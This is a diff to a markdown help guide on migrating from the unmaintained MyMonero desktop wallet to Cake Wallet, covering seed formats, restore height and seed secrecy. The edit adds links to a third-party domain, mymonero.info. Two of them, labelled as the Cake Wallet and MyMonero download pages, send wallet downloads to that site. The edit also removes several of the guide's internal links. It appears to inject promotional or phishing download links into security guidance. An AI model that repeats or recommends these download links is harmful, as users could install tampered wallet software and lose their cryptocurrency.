@@ -20,6 +20,9 @@ All versions and checksums are on the [MyMonero v1.3.3 release page](https://git
 ## Short answer
 MyMonero desktop can still open wallets and send XMR, but its final release v1.3.3 is no longer maintained. Cake Wallet is the alternative described here and supports iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing.
 
+
+The MyMonero.info site covers this in its [MyMonero vs cake wallet guide](https://mymonero.info/mymonero-vs-cake-wallet). Before installing anything, use the [Cake Wallet download page](https://mymonero.info/github/cake-developments), and read [MyMonero safety facts](https://mymonero.info/is-mymonero-safe) if anything feels off.
+
 ## You'll see this if
 - You want to understand what changed after MyMonero hosted access stopped.
 - You are deciding whether to keep the old desktop app or restore a wallet elsewhere.
@@ -42,7 +45,7 @@ Restoration provides access to the existing wallet. It does not send XMR to a ne
 4. **Check your seed format.** Determine whether you have the 13-word MyMonero-specific legacy seed or the standard 25-word Monero seed. Do not change the phrase to fit a screen. Use [13-word restore guidance](./mymonero-13-word-seed-restore.md) or [25-word migration guidance](./mymonero-25-word-seed-migration.md).
 5. **Choose restore or transfer.** To access the same wallet in Cake Wallet, restore the seed. To move funds into a different wallet, send or sweep funds to its address. Do not assume installing another app moves coins automatically.
 6. **Prepare a private recovery backup.** Find your phrase without sharing it, and verify its word order against your own record. Nobody legitimate asks for the seed. Do not paste it into a webpage, chat, or support request.
-7. **Restore with an appropriate height.** Start scanning at or before the relevant activity. Earlier is safer if uncertain but slower. Wait for synchronization to finish before comparing balances. Review [restore height explained](./mymonero-restore-height-explained.md).
+7. **Restore with an appropriate height.** Start scanning at or before the relevant activity. Earlier is safer if uncertain but slower. Wait for synchronization to finish before comparing balances. Review restore height explained.
 8. **Make any transfer only after review.** If you choose to sweep to a new wallet, independently confirm its address and inspect the fee. For a balance that appears incomplete, investigate scanning before sending.
 
 > [!TIP]
@@ -52,9 +55,9 @@ Restoration provides access to the existing wallet. It does not send XMR to a ne
 > Never reveal your seed to compare wallets or receive assistance. Any person who sees it may gain wallet access.
 
 ## If that did not work
-If Cake Wallet does not accept the phrase, verify its selected restore format and the count in your private backup. Do not make guesses or provide the phrase to another person. For safe checks, see [seed not accepted](./mymonero-seed-not-accepted.md).
+If Cake Wallet does not accept the phrase, verify its selected restore format and the count in your private backup. Do not make guesses or provide the phrase to another person. For safe checks, see seed not accepted.
 
-If a restored balance is absent, wait for scanning and review the restore height. A late scan start may omit earlier activity. Error 523 is general guidance that a server connection is unavailable, not proof that funds are gone. See [balance shows zero](./mymonero-balance-shows-zero.md) for a sequence of checks.
+If a restored balance is absent, wait for scanning and review the restore height. A late scan start may omit earlier activity. Error 523 is general guidance that a server connection is unavailable, not proof that funds are gone. See balance shows zero for a sequence of checks.
 
 If you decide to keep using MyMonero desktop, understand its unmaintained status. If you decide to switch, use Cake Wallet on a supported platform and install it from a trusted source. Historical import fees should not be presented as current: MyMonero hosted servers historically charged a one-time fee to import a wallet created elsewhere, but that does not establish a current fee.
 
@@ -92,6 +95,7 @@ A useful comparison also includes your backup readiness: neither platform choice
 
 ## Download MyMonero
 
+- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/cake-developments)
 - Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
 - macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
 - Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)
